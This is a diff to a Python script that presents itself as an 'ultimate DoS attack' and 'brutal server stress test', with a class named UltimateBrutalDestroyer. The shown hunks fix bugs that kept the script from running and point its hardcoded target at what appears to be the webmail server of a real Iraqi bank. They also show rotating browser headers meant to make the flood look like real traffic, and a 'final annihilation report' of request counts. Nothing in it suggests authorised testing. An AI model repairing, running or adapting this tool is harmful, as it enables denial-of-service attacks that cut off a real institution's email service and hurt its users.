@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# -- coding: utf-8 --
+# -*- coding: utf-8 -*-
 """
 🔥 BRUTAL SERVER STRESS TEST 🔥
 Ultimate DoS attack using all system resources - merciless brutality
@@ -37,7 +37,7 @@ if platform.system() == 'Windows':
 logging.getLogger('asyncio').setLevel(logging.CRITICAL)
 
 class UltimateBrutalDestroyer:
-    def _init_(self, target_url="https://mail.iraqiislamicb.iq/mail/WebmailLogin.html"):
+    def __init__(self, target_url="https://mail.iraqiislamicb.iq"):
         self.target_url = target_url
         self.successful_requests = 0
         self.failed_requests = 0
@@ -85,9 +85,9 @@ class UltimateBrutalDestroyer:
         return {
             'User-Agent': random.choice(self.user_agents),
             'Accept': random.choice([
-                'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8',
-                'application/json, text/plain, /',
-                'text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8'
+                'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                'application/json, text/plain, */*',
+                'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
             ]),
             'Accept-Language': random.choice(['en-US,en;q=0.9', 'ar,en-US;q=0.8', 'en-GB,en;q=0.9']),
             'Accept-Encoding': 'gzip, deflate, br',
@@ -482,7 +482,7 @@ class UltimateBrutalDestroyer:
             print("💀 FINAL ANNIHILATION REPORT 💀")
             print("=" * 80)
             print(f"🎯 Target: {self.target_url}")
-            print(f"⏱  Duration: {total_time:.2f} seconds")
+            print(f"⏱️  Duration: {total_time:.2f} seconds")
             print(f"📊 Total Requests: {total_requests:,}")
             print(f"✅ Successful: {self.successful_requests:,}")
             print(f"❌ Failed: {self.failed_requests:,}")
@@ -495,7 +495,7 @@ class UltimateBrutalDestroyer:
 
 def main():
     """Launch ultimate destruction"""
-    target_url = "https://mail.iraqiislamicb.iq/mail/WebmailLogin.html"
+    target_url = "https://mail.iraqiislamicb.iq"
     
     # Create ultimate destroyer
     destroyer = UltimateBrutalDestroyer(target_url)
@@ -528,7 +528,7 @@ def main():
         print("🧹 Final cleanup completed")
 
 
-if _name_ == "_main_":
+if __name__ == "__main__":
     # Suppress additional warnings for cleaner output
     warnings.filterwarnings('ignore', category=RuntimeWarning)
     warnings.filterwarnings('ignore', category=DeprecationWarning)
